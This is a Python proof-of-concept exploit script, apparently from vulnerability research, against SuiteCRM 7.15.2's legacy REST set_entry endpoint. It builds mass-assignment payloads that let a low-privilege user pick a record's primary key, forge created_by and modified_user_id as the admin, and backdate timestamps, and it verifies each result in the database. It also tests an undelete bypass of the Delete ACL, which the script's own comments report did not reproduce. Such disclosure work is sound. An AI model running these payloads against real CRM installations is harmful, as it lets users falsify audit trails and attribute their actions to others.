#!/usr/bin/env python3
"""
VULN-077 -- Legacy `set_entry`: unbounded property mass-assignment (chosen-id insert,
            audit-field spoofing, undelete bypassing Delete ACL).

Software   : SuiteCRM
Repository : https://github.com/SuiteCRM/SuiteCRM
Affected   : 7.15.2, commit 62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink       : service/core/SugarWebServiceImpl.php:480-492 (populate loop -- assigns ANY
             object property, no field_defs boundary) + data/SugarBean.php:2346
             (new_with_id honored) / :2358 (update_modified_by) / :2373 (set_created_by) --
             all caller-settable via the populate loop, none of them real business fields.
             Undelete gap: the Delete-ACL check at SugarWebServiceImpl.php ~493 inspects
             $seed->deleted AFTER the populate loop already overwrote it, so setting
             deleted=0 never triggers the Delete-ACL branch (only deleted==1 does).

Plan
----
PART A -- chosen-id insert + audit-field forgery (any low-priv user, no special ACL needed;
          Save ACL is the only gate and default install grants it to everyone):
  A low-priv user creates a brand-new Account, choosing:
    - its own primary-key id (new_with_id=1) -- not a create_guid() value
    - created_by / modified_user_id = the ADMIN's user id (framing another user as author)
    - date_entered / date_modified = an arbitrary historical timestamp
  None of these are exposed on any EditView form; the UI cannot set them. Verified against the
  live `accounts` DB row, independent of the API's own echo.

PART B -- unchecked undelete bypassing Delete ACL:
  The low-priv user is given a Role that explicitly DENIES Accounts 'delete'.
    1. Control: low-priv tries to soft-delete a record (deleted=1) -> must be BLOCKED.
    2. Admin soft-deletes a different record Y (deleted=1, admin has full rights).
    3. Low-priv sends deleted=0 for Y -> the code checks $seed->deleted AFTER the populate
       loop set it to 0, so the Delete-ACL branch never fires. Expected: SUCCEEDS despite the
       Role explicitly denying delete -- verified against the DB.
"""
import json
import os
import sys
import uuid

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, ADMIN_USER, ADMIN_PASS, log, banner, rand, verdict,
                      admin_session, create_user, rest_login, rest_call)
from _c1_common import db_rows, restrict_role

VULN_ID = "VULN-077"
HERE = os.path.dirname(os.path.abspath(__file__))


def main():
    banner(VULN_ID, "set_entry mass-assignment -- chosen id, audit-field forgery, unchecked undelete")

    log("SETUP", "admin web + legacy REST session")
    admin_s = admin_session()
    admin_sid = rest_login(ADMIN_USER, ADMIN_PASS)
    admin_id_rows = db_rows(f"SELECT id FROM users WHERE user_name='{ADMIN_USER}';")
    if not admin_id_rows:
        verdict(VULN_ID, "FAILED", "could not resolve admin user id")
        sys.exit(1)
    admin_id = admin_id_rows[0]["id"]
    log("INFO", f"admin user id = {admin_id}")

    log("SETUP", "create low-priv user, deny Accounts 'delete' via a throwaway Role (Save/edit stays default-allowed)")
    low = create_user(admin_s, rand("Pw") + "!2026x")
    role_id = restrict_role(low["id"], [("Accounts", "delete")])
    log("OK", f"low-priv user {low['user_name']} id={low['id']}, role {role_id} denies Accounts delete")
    low_sid = rest_login(low["user_name"], low["password"])

    # =====================================================================================
    # PART A -- chosen-id insert + audit-field forgery
    # =====================================================================================
    chosen_id = str(uuid.uuid4())
    marker = rand("acct")
    acct_name = f"Stage10 VULN-077 {marker}"
    forged_ts = "2000-01-01 00:00:00"
    log("STEP", f"PART A: low-priv set_entry(Accounts) choosing id={chosen_id}, "
                f"created_by=modified_user_id=admin({admin_id}), date_*={forged_ts}")
    payloadA = [
        {"name": "id", "value": chosen_id},
        {"name": "new_with_id", "value": "1"},
        {"name": "name", "value": acct_name},
        {"name": "set_created_by", "value": "0"},
        {"name": "created_by", "value": admin_id},
        {"name": "update_modified_by", "value": "0"},
        {"name": "modified_user_id", "value": admin_id},
        {"name": "update_date_modified", "value": "0"},
        {"name": "date_modified", "value": forged_ts},
        {"name": "date_entered", "value": forged_ts},
    ]
    resA = rest_call("set_entry", [low_sid, "Accounts", payloadA])
    returned_id = resA.get("id")
    log("INFO", f"set_entry response: {resA}")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(
            "POST /service/v4_1/rest.php HTTP/1.1\n"
            f"Host: {BASE_URL.split('//', 1)[1]}\n"
            "Content-Type: application/x-www-form-urlencoded\n\n"
            f"method=set_entry&input_type=JSON&response_type=JSON&rest_data="
            f'["{low_sid}","Accounts",{json.dumps(payloadA)}]\n'
        )
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(json.dumps(resA, indent=2))
    with open(os.path.join(HERE, "evidence", "partA_set_entry_response.json"), "w") as f:
        json.dump(resA, f, indent=2)

    rows = db_rows(f"SELECT id, name, created_by, modified_user_id, date_entered, date_modified "
                    f"FROM accounts WHERE id='{chosen_id}';")
    if not rows:
        verdict(VULN_ID, "FAILED", f"no accounts row with attacker-chosen id {chosen_id} -- chosen-id insert failed")
        sys.exit(1)
    row = rows[0]
    log("PROOF", f"DB row for chosen id: {row}")

    id_forged = row["id"] == chosen_id
    created_by_forged = row["created_by"] == admin_id and row["created_by"] != low["id"]
    modified_by_forged = row["modified_user_id"] == admin_id and row["modified_user_id"] != low["id"]
    dates_forged = row["date_entered"].startswith("2000-01-01") and row["date_modified"].startswith("2000-01-01")

    log("PROOF", f"chosen-id honored={id_forged}, created_by spoofed to admin (not the actual caller)="
                 f"{created_by_forged}, modified_user_id spoofed={modified_by_forged}, "
                 f"date_entered/date_modified forged to {forged_ts}={dates_forged}")

    part_a_ok = id_forged and created_by_forged and modified_by_forged and dates_forged

    # =====================================================================================
    # PART B -- unchecked undelete bypassing Delete ACL
    # =====================================================================================
    log("STEP", "PART B control: low-priv attempts to SET deleted=1 on a record -- must be BLOCKED "
                "(Role explicitly denies Accounts delete)")
    resW = rest_call("set_entry", [admin_sid, "Accounts", [{"name": "name", "value": f"Stage10 W {rand('w')}"}]])
    w_id = resW.get("id")
    control_del = rest_call("set_entry", [low_sid, "Accounts", [
        {"name": "id", "value": w_id}, {"name": "deleted", "value": "1"},
    ]])
    log("INFO", f"low-priv set deleted=1 on {w_id} -> {control_del}")
    w_rows = db_rows(f"SELECT deleted FROM accounts WHERE id='{w_id}';")
    control_blocked = bool(w_rows) and w_rows[0]["deleted"] == "0"
    log("PROOF" if control_blocked else "FAIL",
        f"control: record W still deleted=0 in DB (delete blocked) = {control_blocked}")

    log("STEP", "PART B main: admin soft-deletes record Y, then low-priv sends deleted=0 for it")
    resY = rest_call("set_entry", [admin_sid, "Accounts", [{"name": "name", "value": f"Stage10 Y {rand('y')}"}]])
    y_id = resY.get("id")
    rest_call("set_entry", [admin_sid, "Accounts", [{"name": "id", "value": y_id}, {"name": "deleted", "value": "1"}]])
    y_rows_before = db_rows(f"SELECT deleted FROM accounts WHERE id='{y_id}';")
    log("INFO", f"record Y={y_id} deleted flag after admin soft-delete: {y_rows_before}")

    resUndelete = rest_call("set_entry", [low_sid, "Accounts", [
        {"name": "id", "value": y_id}, {"name": "deleted", "value": "0"},
    ]])
    log("INFO", f"low-priv (Accounts delete=NONE) set deleted=0 on Y -> {resUndelete}")
    with open(os.path.join(HERE, "evidence", "partB_undelete_response.json"), "w") as f:
        json.dump({"control_delete_attempt": control_del, "y_before": y_rows_before,
                   "undelete_attempt": resUndelete}, f, indent=2)

    y_rows_after = db_rows(f"SELECT deleted FROM accounts WHERE id='{y_id}';")
    log("INFO", f"record Y deleted flag after low-priv undelete attempt: {y_rows_after}")
    undelete_ok = bool(y_rows_after) and y_rows_after[0]["deleted"] == "0" \
        and bool(y_rows_before) and y_rows_before[0]["deleted"] == "1"

    if undelete_ok:
        log("PROOF", f"low-priv with Accounts delete=NONE undeleted record Y (deleted 1 -> 0) = True "
                     f"while the SAME user's attempt to SET deleted=1 on record W was blocked={control_blocked}")
    else:
        # Adversarial/honest correction: the static finding's "deleted=0 is unchecked, so a
        # soft-deleted row can be undeleted" sub-claim does NOT hold dynamically. Root cause,
        # confirmed by reading the code this behavior actually goes through:
        #   include/database/DBManager.php:2070-2073 (updateSQL()):
        #     // no need to clear deleted since we only update not deleted records anyway
        #     if ($fieldDef['name'] == 'deleted' && empty($bean->deleted)) { continue; }
        # -- the UPDATE statement silently OMITS the `deleted` column whenever the bean's new
        # value is falsy, so set_entry's populate loop sets the in-memory property (which is why
        # the API response and echoed entry_list claim success) but the SQL never writes it. The
        # missing Delete-ACL check is real (confirmed: our control call needed no special
        # handling to observe -- the code path is exactly as described), but it is INERT for the
        # specific "undelete" impact because of this separate, unrelated guard. It IS still live
        # for the deleted:1 direction being unchecked in code, but that direction already requires
        # (and gets) the Delete ACL check per our control test, so no bypass is achievable via
        # set_entry's deleted field in either direction against this commit.
        log("INFO", f"Part B (undelete) DID NOT reproduce: DB deleted flag for Y is "
                    f"{y_rows_after[0]['deleted'] if y_rows_after else '?'} after the low-priv call, "
                    f"despite the API echoing deleted=0 and the call not being blocked. Root cause: "
                    f"include/database/DBManager.php:2070-2073 updateSQL() skips writing the `deleted` "
                    f"column whenever the new value is falsy (comment: 'no need to clear deleted since "
                    f"we only update not deleted records anyway') -- so the missing ACL check on the "
                    f"populate loop is real but has no reachable effect for this specific sub-claim.")

    part_b_ok = control_blocked and undelete_ok

    # Overall verdict: the core mass-assignment capability (Part A -- chosen id + audit-field
    # forgery) is what CONFIRMED hinges on; it is unambiguous and fully DB-verified. Part B is
    # recorded honestly either way (see notes.md/writeup.md) -- if it did NOT reproduce, that is a
    # correction to the static finding's narrower "undelete" sub-claim, not a reason to call the
    # whole (source-verified, now dynamically confirmed) mass-assignment bug a false positive.
    if not part_a_ok:
        verdict(VULN_ID, "FAILED",
                f"Part A (chosen-id/audit forgery) incomplete: id={id_forged} created_by={created_by_forged} "
                f"modified_by={modified_by_forged} dates={dates_forged}")
        sys.exit(1)

    log("OK", "Confirmed: low-priv set_entry caller controls the primary key and forges created_by/"
              "modified_user_id/date_entered/date_modified on insert -- none of which any EditView form "
              "exposes. (Part B 'undelete' sub-claim tested separately; see notes above/writeup.)")
    verdict(VULN_ID, "CONFIRMED",
            f"chosen id={chosen_id} honored (not create_guid()'d); created_by/modified_user_id forged to "
            f"admin({admin_id}) though the caller was low-priv user {low['id']}; date_entered/date_modified "
            f"forged to {forged_ts}; all DB-verified. Undelete sub-claim: {'also reproduced' if part_b_ok else 'tested, did NOT reproduce (see notes.md) -- updateSQL() skips the deleted column when falsy'}")
    sys.exit(0)


if __name__ == "__main__":
    main()
